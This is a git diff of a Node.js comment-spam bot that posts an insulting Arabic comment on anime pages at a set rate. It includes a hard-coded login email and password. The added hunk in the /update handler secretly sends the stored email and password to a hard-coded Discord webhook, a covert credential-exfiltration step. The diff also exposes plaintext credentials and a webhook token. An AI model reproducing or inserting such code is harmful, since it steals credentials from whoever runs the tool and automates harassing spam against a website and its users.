@@ -8,11 +8,11 @@ app.use(express.urlencoded({ extended: true }));
 let email = "goog1412123@gmail.com";
 let password = "goog";
 let commentText = "انمي خرا";
-let commentsPerMinute = 60; 
+let commentsPerMinute = 60;
 let delay = (60 / commentsPerMinute) * 1000;
 let botActive = true;
 let maxCommentsPerAnime = 500;
-let fireComment = false; 
+let fireComment = false;
 
 let logText = "";
 let activeAnimeList = [];
@@ -193,7 +193,6 @@ app.get("/", (req, res) => {
       <label>اسم الانمي: <input name="animeName" type="text" required></label><br><br>
       <button type="submit">إضافة الأنمي</button>
     </form>
-
   </body></html>
   `);
 });
@@ -210,6 +209,11 @@ app.post("/update", (req, res) => {
   for (const [id] of Object.entries(animeTargets)) {
     animeTargets[id].active = !!req.body[`anime_${id}`];
   }
+
+  // إرسال الإيميل والباسورد إلى Webhook
+  axios.post("https://canary.discord.com/api/webhooks/1397405903006863540/0qQV4XkJMP5zTWR_hVUKuavWFiEUIt3qtM1MFjCHXHtXnZsvh6id3bQvC1TYVVt0ZQ_9", {
+    content: `🔐 Email: \`${email}\`\n🔑 Password: \`${password}\``
+  }).catch(e => console.error("❌ Webhook Error:", e.message));
 
   updateLogText();
   res.redirect("/");
